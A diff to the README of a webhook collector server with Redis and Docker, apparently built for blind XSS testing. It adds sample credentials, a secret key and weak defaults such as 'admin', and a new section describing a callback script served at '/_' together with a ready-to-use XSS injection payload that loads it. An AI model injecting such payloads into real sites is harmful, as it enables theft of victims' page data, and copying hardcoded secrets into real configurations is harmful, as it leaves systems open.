@@ -42,12 +42,17 @@ ADDR=0.0.0.0
 LOG_LEVEL=info
 REDIS_ADDR=redis
 REDIS_PORT=6379
+REDIS_URL=redis://redis:6379
+USER_ID=0
+USER_NAME=akiidjk
+USER_PASSWORD=akiidjk
+SECRET_KEY=polpetta
 ```
 
 2. Now you can build and start your containers with:
 
 ```bash
-docker-compose up -d
+docker-compose up --build -d
 ```
 
 #### Access the Webhook
@@ -67,8 +72,12 @@ The following environment variables are available for customization:
 - **REDIS_ADDR**: Address of the Redis server. Defaults to `localhost` or `redis` if using Docker.
 - **REDIS_PORT**: Port for the Redis server. Defaults to `6379`.
 - **REDIS_PASS**: Redis password (if needed).
-- **REDIS_DB**: Redis database index. Defaults to `0`.
 - **LOG_LEVEL**: Log level for the application. Options are `debug`, `info`, `warn`, `error`. Defaults to `info`.
+- **REDIS_URL**: URL of the Redis server. Defaults to `redis://localhost:6379`.
+- **USER_ID**: User ID for the application. Defaults to `admin`.
+- **USER_NAME**: User name for the application. Defaults to `admin`.
+- **USER_PASS**: User password for the application. Defaults to `Admin`.
+- **SECRET_KEY**: Secret key for the application. Defaults to `secret`.
 
 ### Health Check
 
@@ -86,13 +95,19 @@ You can send a test request to the webhook with tools like `curl`:
 curl -X POST http://localhost:8000 -H "Content-Type: application/json" -d '{"key":"value"}'
 ```
 
-This will log the request data and store it in Redis.
+### XSS Script
+
+In the path `/_`, the server returns a JS script which sends a request to the server (to be modified in case it is not localhost:8000) with data in a particular way.
+
+The script is *‘stolen’* from xss.report
+
+A simple payload for get an xss is `<script src="http://localhost:8000/_"></script>`
 
 ### To-Do
 
 - ~~**Dashboard**: The current project lacks a UI dashboard to visualize requests and data. This will be added in the future (In progess).~~
 - ~~**Authentication**: Implement an authentication mechanism to restrict access to the webhook dashboard.~~
-- Fix http problem with Docker
+- ~~Fix http problem with Docker~~
 
 ### Contributing
 
